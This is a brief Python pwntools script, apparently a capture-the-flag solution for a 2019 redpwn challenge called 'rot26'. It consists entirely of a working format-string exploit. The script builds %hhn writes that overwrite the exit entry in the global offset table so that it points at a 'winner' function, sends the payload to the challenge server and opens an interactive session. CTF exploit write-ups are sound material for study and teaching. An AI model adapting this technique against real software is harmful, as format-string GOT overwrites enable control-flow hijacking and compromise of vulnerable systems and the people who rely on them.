from pwn import *

debug = 0
context.log_level = 'debug'

def exploit():
	winnerAddr = p32(0x08048737)
	exitAddr_plt = 0x804a020

	offset = 7 + 48/4
	printed = 0
	payload = ''
	addr = ''
	for i in range(len(winnerAddr)):
		toPrint = ord(winnerAddr[i])
		t = toPrint - printed
		if t <= 0:
			t += 256
		payload += "%{}c%{}$hhn".format(t, offset + i)
		printed = toPrint
		addr += p32(exitAddr_plt + i)
	payload = payload.ljust(48, '\x00') + addr

	print [payload]
	p.sendline(payload)
if __name__ == '__main__':
	if debug:
		p = process('./rot26')
	else:
		p = remote('chall2.2019.redpwn.net', 4003)
	exploit()
	p.interactive()